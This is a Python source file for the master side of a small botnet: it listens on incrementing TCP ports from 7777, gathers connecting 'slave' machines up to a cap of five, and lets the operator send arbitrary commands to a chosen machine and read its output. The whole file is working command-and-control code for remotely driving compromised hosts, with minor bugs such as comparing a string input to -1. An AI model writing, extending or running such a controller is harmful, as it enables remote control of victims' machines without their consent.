import socket
from threading import Thread

current_port = 7777
MAX_BOTS = 5
SLAVES = []

def listen(port):
    global current_port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("",port))
    s.listen()
    slave, slave_address = s.accept()
    SLAVES.append(slave)
    current_port+=1

def main():
    print("[+] Master bot listening for incoming connections")
    # ListenerThread = Thread(target=listen,args=(current_port), daemon=True)
    # ListenerThread.start()
    listen(current_port)
    while True:
        if len(SLAVES)!=0:
            while True:
                print("[+] Enumerating all SLAVES.")
                # ListenerThread = Thread(target=listen,args=(current_port), daemon=True)
                # ListenerThread.start()
                for index, individual_slave in enumerate(SLAVES):
                    print("[i] ", index, ". slave ip: ", individual_slave.getpeername())
                choice = input("enter the index of the slave you want to communicate with: \nenter -1 to exit: \n enter listen to listen for connections:")
                if choice == "-1":
                    break
                if choice == "listen":
                        n = int(input("enter number of clients to listen for"))
                        for i in range(n):
                            if(len(SLAVES)<MAX_BOTS):
                                listen(current_port)
                            else:
                                print("max capacity reached. cannot add more bots to botnet")
                while True:
                    try:
                        msg = input("[+] enter command: ")
                        SLAVES[int(choice)].send(msg.encode())
                        if msg == "exit":
                            break
                        print(SLAVES[int(choice)].recv(1024).decode())
                    except Exception as e: 
                        print(e)
                        exit
                
            if choice==-1:
                break


if __name__=="__main__":
    main()